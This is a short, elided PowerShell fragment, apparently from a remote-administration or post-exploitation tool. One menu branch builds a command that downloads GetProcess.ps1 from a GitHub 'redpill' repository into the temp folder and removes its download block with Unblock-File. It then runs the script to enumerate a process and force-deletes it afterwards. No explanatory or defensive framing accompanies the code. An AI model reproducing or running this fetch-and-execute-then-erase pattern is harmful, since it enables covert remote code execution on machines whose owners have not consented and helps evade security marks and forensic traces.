    ...
    If($Command -ieq "AdvInfo" -or $Command -ieq "adv")
    {
      ...
      If($choise -ieq "Processes" -or $choise -ieq "proc")
      {
         ...
         If($wifi_choise -ieq "Query")
         {
            ...
            Else
            {
               write-host " * Query process name verbose information." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
               $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetProcess.ps1`" -OutFile `"`$Env:TMP\GetProcess.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\GetProcess.ps1`" -GetProcess Enum -ProcessName `"$Proc_name`" -verb true;Remove-Item -Path `$Env:TMP\GetProcess.ps1 -Force";
            }
         }
